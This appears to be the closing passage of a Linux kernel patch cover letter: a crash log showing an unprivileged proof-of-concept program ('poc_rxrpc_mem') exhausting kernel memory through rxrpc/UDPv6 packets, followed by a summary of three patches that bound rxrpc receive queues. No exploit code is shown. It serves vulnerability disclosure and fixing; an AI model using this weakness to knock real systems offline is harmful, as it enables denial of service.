[  275.048596][ T9427] Node 0 hugepages_total=0 hugepages_free=0 hugepages_surp=0 hugepages_size=1048576kB
[  275.048602][ T9427] Node 0 hugepages_total=4 hugepages_free=4 hugepages_surp=0 hugepages_size=2048kB
[  275.048609][ T9427] 2916 total pagecache pages
[  275.048611][ T9427] 0 pages in swap cache
[  275.048614][ T9427] Free swap  = 0kB
[  275.048617][ T9427] Total swap = 0kB
[  275.048619][ T9427] 524158 pages RAM
[  275.048622][ T9427] 0 pages HighMem/MovableOnly
[  275.048627][ T9427] 188743 pages reserved
[  275.048629][ T9427] 0 pages cma reserved
[  275.048632][ T9427] Unreclaimable slab info:
[  275.048635][ T9427] Name                      Used          Total
[  275.048644][ T9427] bio-464                    1KB         15KB
[  275.048650][ T9427] bio-528                    3KB         15KB
[  275.048656][ T9427] bio-544                    1KB         15KB
[  275.048662][ T9427] bio-552                    1KB         15KB
[  275.048736][ T9427] TIPC                       1KB         31KB
[  275.048743][ T9427] SCTPv6                     2KB         30KB
[  275.048750][ T9427] RXRPC                      2KB         30KB
[  275.048755][ T9427] rxrpc_call_jar           197KB        217KB
[  275.048762][ T9427] fib6_node                  2KB          4KB
[  275.048767][ T9427] ip6_dst_cache              1KB          7KB
[  275.048773][ T9427] RAWv6                     17KB         30KB
[  275.048778][ T9427] UDPv6                     40KB         61KB
[  275.048784][ T9427] TCPv6                     10KB         31KB
[  275.048796][ T9427] t10_alua_lu_gp_cache          0KB          7KB
[  275.048802][ T9427] scsi_sense_cache           2KB          3KB
[  275.048808][ T9427] virtio_scsi_cmd           24KB         31KB
[  275.048813][ T9427] bio-136                   43KB         45KB
[  275.048824][ T9427] bio-264                    1KB          7KB
[  275.048847][ T9427] mqueue_inode_cache          1KB         30KB
[  275.048855][ T9427] f2fs_evict_inode_work          1KB          3KB
[  275.048862][ T9427] bio-272                    4KB          8KB
[  275.048867][ T9427] f2fs_bio_post_read_ctx         28KB         31KB
[  275.048892][ T9427] jfs_mp                     9KB         11KB
[  275.048902][ T9427] cifs_small_rq             18KB         22KB
[  275.048909][ T9427] cifs_request              67KB         67KB
[  275.048914][ T9427] cifs_mpx_ids               1KB          7KB
[  275.048919][ T9427] cifs_io_subrequest         50KB         56KB
[  275.048924][ T9427] cifs_io_request          100KB        112KB
[  275.048932][ T9427] nfs_commit_data            4KB         16KB
[  275.048939][ T9427] nfs_write_data            38KB         46KB
[  275.048949][ T9427] jbd2_inode                 5KB          7KB
[  275.048955][ T9427] ext4_system_zone           1KB         11KB
[  275.048960][ T9427] ext4_io_end_vec            0KB          3KB
[  275.048969][ T9427] fasync_cache               0KB          3KB
[  275.048976][ T9427] kvm_gmem_inode_cache          1KB         15KB
[  275.048982][ T9427] rpc_buffers               18KB         31KB
[  275.048987][ T9427] rpc_tasks                  3KB          7KB
[  275.048993][ T9427] UNIX-STREAM               38KB        189KB
[  275.048998][ T9427] UNIX                      42KB         63KB
[  275.049004][ T9427] tcp_bind2_bucket           1KB          4KB
[  275.049009][ T9427] tcp_bind_bucket            0KB          4KB
[  275.049015][ T9427] ip_fib_trie                1KB          3KB
[  275.049020][ T9427] ip_fib_alias               1KB          3KB
[  275.049046][ T9427] rtable                     1KB          7KB
[  275.049052][ T9427] RAW                       12KB         32KB
[  275.049057][ T9427] UDP                        4KB         63KB
[  275.049062][ T9427] tw_sock_TCP                0KB          7KB
[  275.049067][ T9427] request_sock_TCP           0KB          7KB
[  275.049073][ T9427] TCP                       10KB         30KB
[  275.049078][ T9427] fs_bio_integrity           0KB          4KB
[  275.049084][ T9427] hugetlbfs_inode_cache          3KB         15KB
[  275.049089][ T9427] netfs_subrequest          37KB         39KB
[  275.049095][ T9427] netfs_request            100KB        112KB
[  275.049100][ T9427] bio-288                   32KB         32KB
[  275.049105][ T9427] bio-328                    2KB          8KB
[  275.049110][ T9427] ep_head                    6KB         19KB
[  275.049116][ T9427] eventpoll_pwq              9KB         31KB
[  275.049122][ T9427] eventpoll_epi             16KB         45KB
[  275.049128][ T9427] inotify_inode_mark         27KB         31KB
[  275.049133][ T9427] bpf_fs_inode_cache          1KB         15KB
[  275.049139][ T9427] sgpool-128                 8KB         30KB
[  275.049144][ T9427] sgpool-64                  4KB         31KB
[  275.049149][ T9427] sgpool-32                  2KB         30KB
[  275.049154][ T9427] sgpool-16                  3KB         31KB
[  275.049160][ T9427] sgpool-8                   2KB         31KB
[  275.049165][ T9427] bio_crypt_ctx             19KB         19KB
[  275.049170][ T9427] bio_integrity_data          0KB          7KB
[  275.049175][ T9427] request_queue            161KB        182KB
[  275.049180][ T9427] blkdev_ioc                 0KB          7KB
[  275.049186][ T9427] bio-200                   20KB         31KB
[  275.049191][ T9427] biovec-max               511KB        520KB
[  275.049196][ T9427] biovec-128                 0KB         31KB
[  275.049201][ T9427] biovec-64                  0KB         45KB
[  275.049207][ T9427] biovec-16                  0KB         23KB
[  275.049213][ T9427] uid_cache                  0KB          7KB
[  275.049219][ T9427] dmaengine-unmap-256          2KB         31KB
[  275.049224][ T9427] dmaengine-unmap-128          1KB         15KB
[  275.049229][ T9427] dmaengine-unmap-16          0KB          7KB
[  275.049234][ T9427] dmaengine-unmap-2          0KB          4KB
[  275.049238][ T9427] QIPCRTR                    1KB         30KB
[  275.049243][ T9427] audit_buffer               0KB          7KB
[  275.049249][ T9427] skbuff_small_head     521844KB     521859KB
[  275.049255][ T9427] skbuff_fclone_cache          2KB         47KB
[  275.049260][ T9427] skbuff_head_cache     243491KB     243491KB
[  275.049265][ T9427] configfs_dir_cache          4KB          7KB
[  275.049271][ T9427] file_lock_cache            0KB         30KB
[  275.049276][ T9427] file_lock_ctx             18KB         19KB
[  275.049281][ T9427] fsnotify_inode_mark_connector         21KB         22KB
[  275.049287][ T9427] taskstats                  1KB         15KB
[  275.049293][ T9427] mem_cgroup_per_node         78KB        120KB
[  275.049299][ T9427] mem_cgroup                87KB        123KB
[  275.049305][ T9427] proc_dir_entry           308KB        339KB
[  275.049311][ T9427] pde_opener                 0KB          3KB
[  275.049316][ T9427] seq_file                  14KB         31KB
[  275.049322][ T9427] sigqueue                   0KB         11KB
[  275.049329][ T9427] shmem_inode_cache       8435KB       8541KB
[  275.049336][ T9427] kernfs_iattrs_cache        221KB        244KB
[  275.049343][ T9427] kernfs_node_cache      21315KB      21388KB
[  275.049349][ T9427] mnt_cache                 54KB         78KB
[  275.049366][ T9427] filp                     360KB        819KB
[  275.049373][ T9427] names_cache               39KB        126KB
[  275.049378][ T9427] net_namespace              9KB         29KB
[  275.049383][ T9427] ima_iint_cache           161KB        161KB
[  275.049388][ T9427] hashtab_node             927KB        928KB
[  275.049394][ T9427] ebitmap_node            2110KB       2118KB
[  275.049399][ T9427] avtab_node             16916KB      16917KB
[  275.049408][ T9427] avc_node                  91KB        138KB
[  275.049460][ T9427] lsm_inode_cache         6208KB       8015KB
[  275.049470][ T9427] lsm_file_cache            98KB        253KB
[  275.049475][ T9427] key_jar                   25KB         32KB
[  275.049480][ T9427] uts_namespace              0KB         15KB
[  275.049486][ T9427] nsproxy                    0KB          3KB
[  275.049504][ T9427] vm_area_struct          1175KB       1968KB
[  275.049510][ T9427] fs_cache                   9KB         39KB
[  275.049516][ T9427] files_cache               26KB         95KB
[  275.049521][ T9427] task_exec_state            4KB         15KB
[  275.049553][ T9427] signal_cache             536KB       1880KB
[  275.049564][ T9427] sighand_cache            679KB       2006KB
[  275.049581][ T9427] task_struct             2444KB       4254KB
[  275.049591][ T9427] cred                     132KB        543KB
[  275.049603][ T9427] anon_vma_chain           316KB        511KB
[  275.049612][ T9427] anon_vma                 294KB        468KB
[  275.049621][ T9427] pid                      134KB        425KB
[  275.049629][ T9427] Acpi-Operand              76KB        154KB
[  275.049636][ T9427] Acpi-ParseExt              0KB         15KB
[  275.049641][ T9427] Acpi-Parse                 0KB         15KB
[  275.049647][ T9427] Acpi-State                 0KB         15KB
[  275.049652][ T9427] Acpi-Namespace            55KB         62KB
[  275.049657][ T9427] numa_policy                0KB          3KB
[  275.049662][ T9427] perf_event                 0KB         31KB
[  275.049667][ T9427] trace_event_file         881KB        883KB
[  275.049673][ T9427] ftrace_event_field       2011KB       2012KB
[  275.049678][ T9427] pool_workqueue           762KB        787KB
[  275.049708][ T9427] maple_node               719KB       2567KB
[  275.049714][ T9427] mm_struct                 78KB        250KB
[  275.136004][ T9427] vmap_area                474KB        873KB
[  275.136025][ T9427] debug_objects_cache       2585KB       2589KB
[  275.136035][ T9427] page->ptl                 56KB        134KB
[  275.136040][ T9427] kmalloc-cg-8k            216KB        288KB
[  275.136048][ T9427] kmalloc-cg-4k           1524KB       1752KB
[  275.136055][ T9427] kmalloc-cg-2k           1440KB       1620KB
[  275.136061][ T9427] kmalloc-cg-1k            210KB        270KB
[  275.136066][ T9427] kmalloc-cg-512           115KB        220KB
[  275.136071][ T9427] kmalloc-cg-256            69KB        110KB
[  275.136078][ T9427] kmalloc-cg-128          1525KB       1559KB
[  275.136093][ T9427] kmalloc-cg-64             98KB        344KB
[  275.136103][ T9427] kmalloc-cg-32           1276KB       1315KB
[  275.136108][ T9427] kmalloc-cg-16              7KB         15KB
[  275.136113][ T9427] kmalloc-cg-8              12KB         23KB
[  275.136119][ T9427] kmalloc-cg-192            22KB         31KB
[  275.136127][ T9427] kmalloc-cg-96            694KB        728KB
[  275.136138][ T9427] kmalloc-8k              2424KB       2544KB
[  275.136171][ T9427] kmalloc-4k              5304KB       8280KB
[  275.136176][ T9427] kmalloc-2k             14070KB      14070KB
[  275.136182][ T9427] kmalloc-1k              4494KB       4620KB
[  275.136190][ T9427] kmalloc-512             6868KB       7339KB
[  275.136198][ T9427] kmalloc-256             4458KB       4567KB
[  275.136216][ T9427] kmalloc-128             1152KB       1464KB
[  275.136245][ T9427] kmalloc-64              6098KB       6352KB
[  275.136285][ T9427] kmalloc-32              1428KB       2354KB
[  275.136294][ T9427] kmalloc-16              2687KB       2714KB
[  275.136303][ T9427] kmalloc-8               1694KB       1744KB
[  275.136314][ T9427] kmalloc-192             1727KB       1787KB
[  275.136335][ T9427] kmalloc-96              2442KB       2608KB
[  275.136340][ T9427] kmem_cache_node          180KB        180KB
[  275.136345][ T9427] kmem_cache               215KB        220KB
[  275.136351][ T9427] Memory cgroup min protection 0kB -- low protection 0kB
[  275.136355][ T9427] Tasks state (memory values in pages):
[  275.136358][ T9427] [  pid  ]   uid  tgid total_vm      rss rss_anon rss_file rss_shmem pgtables_bytes swapents oom_score_adj name
[  275.136521][ T9427] [   4992]     0  4992     8006      224      221        2         1    81920        0          -250 systemd-journal
[  275.136538][ T9427] [   5006]     0  5006     9316     2913     2911        2         0    98304        0         -1000 systemd-udevd
[  275.136572][ T9427] [   8881]     0  8881     1411       71       69        2         0    49152        0             0 cron
[  275.136587][ T9427] [   8934]     0  8934    55235      389      387        2         0    77824        0             0 rsyslogd
[  275.315992][ T9427] [   9211]     0  9211    24973      356      354        2         0    81920        0             0 dhclient
[  275.316018][ T9427] [   9258]     0  9258      720       34       32        2         0    45056        0             0 agetty
[  275.316038][ T9427] [   9259]     0  9259      720       34       32        2         0    49152        0             0 agetty
[  275.316058][ T9427] [   9260]     0  9260      720       34       32        2         0    40960        0             0 agetty
[  275.316077][ T9427] [   9261]     0  9261      720       34       32        2         0    40960        0             0 agetty
[  275.316096][ T9427] [   9262]     0  9262      720       34       32        2         0    45056        0             0 agetty
[  275.316115][ T9427] [   9263]     0  9263      720       34       32        2         0    45056        0             0 agetty
[  275.316140][ T9427] [   9264]     0  9264     1101       36       34        2         0    49152        0             0 agetty
[  275.316159][ T9427] [   9265]     0  9265     3340      244      242        2         0    73728        0         -1000 sshd
[  275.316179][ T9427] [   9267]     0  9267    14097      391      390        1         0    86016        0             0 nginx
[  275.316202][ T9427] [   9268]    33  9268    14191      472      470        2         0    86016        0             0 nginx
[  275.316221][ T9427] [   9269]    33  9269    14191      472      470        2         0    86016        0             0 nginx
[  275.316240][ T9427] [   9405]     0  9405      622       51       21       30         0    40960        0             0 sh
[  275.316259][ T9427] [   9419]     0  9419     2019      125      123        2         0    57344        0             0 runuser
[  275.316278][ T9427] [   9421]  1001  9421   246315       62       61        1         0   102400        0             0 poc_rxrpc_mem
[  275.316304][ T9427] Kernel panic - not syncing: Out of memory: system-wide panic_on_oom is enabled
[  275.370927][ T9427] CPU: 0 UID: 1001 PID: 9427 Comm: poc_rxrpc_mem Not tainted 7.3.0-rc6+ #1 PREEMPT(full) 
[  275.372055][ T9427] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[  275.373418][ T9427] Call Trace:
[  275.373804][ T9427]  <TASK>
[  275.374131][ T9427]  dump_stack_lvl (lib/dump_stack.c:94 lib/dump_stack.c:120)
[  275.374642][ T9427]  dump_stack (lib/dump_stack.c:129)
[  275.375119][ T9427]  vpanic (kernel/panic.c:651)
[  275.375592][ T9427]  ? __pfx_vpanic (kernel/panic.c:363)
[  275.376192][ T9427]  ? rcu_preempt_deferred_qs_irqrestore (kernel/rcu/tree_plugin.h:573 (discriminator 31))
[  275.377078][ T9427]  panic (kernel/panic.c:788)
[  275.377519][ T9427]  ? __pfx_panic (kernel/panic.c:741)
[  275.378047][ T9427]  ? __rcu_read_unlock (kernel/rcu/tree_plugin.h:798 kernel/rcu/tree_plugin.h:438)
[  275.378713][ T9427]  ? dump_header (mm/oom_kill.c:475)
[  275.379246][ T9427]  out_of_memory (mm/oom_kill.c:1076 (discriminator 4) mm/oom_kill.c:1143)
[  275.379795][ T9427]  ? __pfx_out_of_memory (mm/oom_kill.c:835)
[  275.380579][ T9427]  __alloc_frozen_pages_noprof (mm/page_alloc.c:4113 mm/page_alloc.c:5030 mm/page_alloc.c:5449)
[  275.381284][ T9427]  ? __pfx___alloc_frozen_pages_noprof (mm/page_alloc.c:4022)
[  275.382093][ T9427]  ? stack_trace_save (kernel/stacktrace.c:122 (discriminator 1))
[  275.382694][ T9427]  ? __sanitizer_cov_trace_const_cmp4 (kernel/kcov.c:310)
[  275.383409][ T9427]  ? __lock_acquire (kernel/locking/lockdep.c:4718 kernel/locking/lockdep.c:5242)
[  275.384085][ T9427]  ? kmalloc_reserve (net/core/skbuff.c:615 (discriminator 2))
[  275.384950][ T9427]  ? __sanitizer_cov_trace_const_cmp8 (kernel/kcov.c:317)
[  275.385645][ T9427]  ? policy_nodemask (mm/mempolicy.c:2304 (discriminator 1))
[  275.386188][ T9427]  alloc_pages_mpol (mm/mempolicy.c:2486)
[  275.386762][ T9427]  ? __pfx_alloc_pages_mpol (mm/mempolicy.c:2275)
[  275.387523][ T9427]  alloc_frozen_pages_noprof (mm/mempolicy.c:2557 (discriminator 1))
[  275.388152][ T9427]  allocate_slab (mm/slub.c:3345 (discriminator 2) mm/slub.c:3470)
[  275.388700][ T9427]  new_slab (mm/slub.c:3513)
[  275.389202][ T9427]  ___slab_alloc (mm/slub.c:4568)
[  275.389734][ T9427]  kmem_cache_alloc_node_noprof (mm/slub.c:4987 mm/slub.c:5068)
[  275.390416][ T9427]  ? __local_bh_enable_ip (kernel/softirq.c:478)
[  275.391002][ T9427]  ? __alloc_skb (net/core/skbuff.c:704 (discriminator 2))
[  275.391513][ T9427]  __alloc_skb (net/core/skbuff.c:704 (discriminator 2))
[  275.392005][ T9427]  ? __alloc_skb (include/linux/bottom_half.h:20 (discriminator 1) net/core/skbuff.c:697)
[  275.392508][ T9427]  ? __pfx___alloc_skb (include/linux/fortify-string.h:447)
[  275.393075][ T9427]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
[  275.393706][ T9427]  ? lockdep_hardirqs_on (kernel/locking/lockdep.c:4516)
[  275.394284][ T9427]  alloc_skb_with_frags (include/linux/skbuff.h:1384 net/core/skbuff.c:6803)
[  275.394916][ T9427]  sock_alloc_send_pskb (net/core/sock.c:3022)
[  275.395495][ T9427]  ? lockdep_hardirqs_on (kernel/locking/lockdep.c:4516)
[  275.396051][ T9427]  ? __pfx_sock_alloc_send_pskb (net/core/sock.c:2854 (discriminator 2))
[  275.396686][ T9427]  ? debug_smp_processor_id (lib/smp_processor_id.c:58)
[  275.397411][ T9427]  ? __lock_acquire (kernel/locking/lockdep.c:4718 kernel/locking/lockdep.c:5242)
[  275.398103][ T9427]  __ip6_append_data (include/net/sock.h:1907 net/ipv6/ip6_output.c:1695)
[  275.398645][ T9427]  ? find_held_lock (kernel/locking/lockdep.c:5401)
[  275.399147][ T9427]  ? __pfx_ip_generic_getfrag (include/linux/skbuff.h:3143)
[  275.399809][ T9427]  ? __pfx___ip6_append_data (net/ipv6/ip6_output.c:2063)
[  275.400424][ T9427]  ? ip6_mtu (net/ipv6/route.c:3296)
[  275.400886][ T9427]  ? ip6_setup_cork (net/ipv6/ip6_output.c:1450)
[  275.401561][ T9427]  ip6_make_skb (net/ipv6/ip6_output.c:2094)
[  275.402047][ T9427]  ? __pfx_ip_generic_getfrag (include/linux/skbuff.h:3143)
[  275.402642][ T9427]  ? __pfx_ip6_make_skb (net/ipv6/ip6_output.c:2040)
[  275.403221][ T9427]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
[  275.404006][ T9427]  udpv6_sendmsg (net/ipv6/udp.c:1720)
[  275.404545][ T9427]  ? udpv6_sendmsg (net/ipv6/udp.c:1720)
[  275.405064][ T9427]  ? find_held_lock (kernel/locking/lockdep.c:5401)
[  275.405794][ T9427]  ? __pfx_udpv6_sendmsg (net/ipv6/udp.c:338)
[  275.406316][ T9427]  ? __sanitizer_cov_trace_const_cmp4 (kernel/kcov.c:310)
[  275.406958][ T9427]  ? __pfx_avc_has_perm (security/selinux/avc.c:1154)
[  275.407483][ T9427]  ? sock_has_perm (security/selinux/hooks.c:5054 (discriminator 1))
[  275.407991][ T9427]  ? __pfx_udpv6_sendmsg (net/ipv6/udp.c:338)
[  275.408541][ T9427]  inet6_sendmsg (net/ipv6/af_inet6.c:641 (discriminator 4))
[  275.409095][ T9427]  ? inet6_sendmsg (net/ipv6/af_inet6.c:641 (discriminator 4))
[  275.409691][ T9427]  __sys_sendto (net/socket.c:800 (discriminator 1) net/socket.c:815 net/socket.c:2281)
[  275.410329][ T9427]  ? __pfx___sys_sendto (net/socket.c:2235)
[  275.410915][ T9427]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
[  275.411551][ T9427]  ? xfd_validate_state (arch/x86/kernel/fpu/xstate.c:1544)
[  275.412148][ T9427]  __x64_sys_sendto (net/socket.c:2288 net/socket.c:2284 net/socket.c:2284)
[  275.412704][ T9427]  ? __this_cpu_preempt_check (lib/smp_processor_id.c:64)
[  275.413384][ T9427]  ? lockdep_hardirqs_on (kernel/locking/lockdep.c:4516)
[  275.414221][ T9427]  x64_sys_call (arch/x86/include/generated/asm/syscalls_64.h:45)
[  275.414884][ T9427]  do_syscall_64 (arch/x86/entry/syscall_64.c:61 arch/x86/entry/syscall_64.c:84)
[  275.415461][ T9427]  entry_SYSCALL_64_after_hwframe (arch/x86/entry/entry_64.S:121)
[  275.416325][ T9427] RIP: 0033:0x423104
[  275.416869][ T9427] Code: Unable to access opcode bytes at 0x4230da.

Code starting with the faulting instruction
===========================================
[  275.417602][ T9427] RSP: 002b:00007fd17b1191b0 EFLAGS: 00000293 ORIG_RAX: 000000000000002c
[  275.418680][ T9427] RAX: ffffffffffffffda RBX: 0000000000000000 RCX: 0000000000423104
[  275.419639][ T9427] RDX: 0000000000000024 RSI: 00007fd15c000b70 RDI: 0000000000000008
[  275.420576][ T9427] RBP: 00007fd17b1191f0 R08: 000000001c46aae8 R09: 000000000000001c
[  275.421697][ T9427] R10: 0000000000000000 R11: 0000000000000293 R12: 00000000000087cf
[  275.422817][ T9427] R13: 000000008010f9c6 R14: 000000000043e718 R15: 000000001c46aae8
[  275.423714][ T9427]  </TASK>
[  275.424907][ T9427] Kernel Offset: disabled
[  275.425408][ T9427] Rebooting in 86400 seconds..
-----END crash log-----

Best regards,
Zihan Xi

Zihan Xi (3):
  rxrpc: account encapsulated packets to UDP socket
  rxrpc: bound connection and OOB receive queues
  rxrpc: bound DATA receive queues

 net/rxrpc/ar-internal.h  |  23 ++++++++
 net/rxrpc/call_event.c   |   1 +
 net/rxrpc/call_object.c  |   4 +-
 net/rxrpc/conn_event.c   |  29 ++++++++--
 net/rxrpc/conn_object.c  |  19 +++++-
 net/rxrpc/input.c        |  83 ++++++++++++++++++---------
 net/rxrpc/io_thread.c    |  63 +++++++++++++++++++-
 net/rxrpc/local_object.c |  25 +++++++-
 net/rxrpc/oob.c          |  20 ++++---
 net/rxrpc/recvmsg.c      |   7 ++-
 net/rxrpc/skbuff.c       | 121 ++++++++++++++++++++++++++++++++++++++-
 11 files changed, 344 insertions(+), 51 deletions(-)

-- 
2.43.0

